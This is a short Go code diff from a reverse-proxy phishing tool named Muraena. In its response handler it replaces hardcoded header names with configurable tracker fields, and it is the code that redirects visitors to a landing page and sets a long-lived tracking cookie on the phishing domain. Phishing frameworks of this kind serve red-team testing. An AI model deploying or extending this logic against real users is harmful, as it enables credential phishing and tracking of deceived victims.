@@ -222,16 +222,14 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 		sess.Config.Transform.Base64.Padding,
 	}
 
-	if response.Request.Header.Get("If-Landing-Redirect") != "" {
+	if response.Request.Header.Get(muraena.Tracker.Landing) != "" {
 		response.StatusCode = 302
-		response.Header.Add("If-Range", response.Request.Header.Get("If-Range"))
+		response.Header.Add(muraena.Tracker.Header, response.Request.Header.Get(muraena.Tracker.Header))
 		response.Header.Add("Set-Cookie",
 			fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
-				muraena.Session.Config.Tracking.Identifier, response.Request.Header.Get("If-Range"),
+				muraena.Session.Config.Tracking.Identifier, response.Request.Header.Get(muraena.Tracker.Header),
 				muraena.Session.Config.Proxy.Phishing))
-		response.Header.Set("Location", response.Request.Header.Get("If-Landing-Redirect"))
-
-		//log.Warning("Setting cookies: %s", response.Request.Headers.Get("If-Range"))
+		response.Header.Set("Location", response.Request.Header.Get(muraena.Tracker.Landing))
 		return
 	}
 
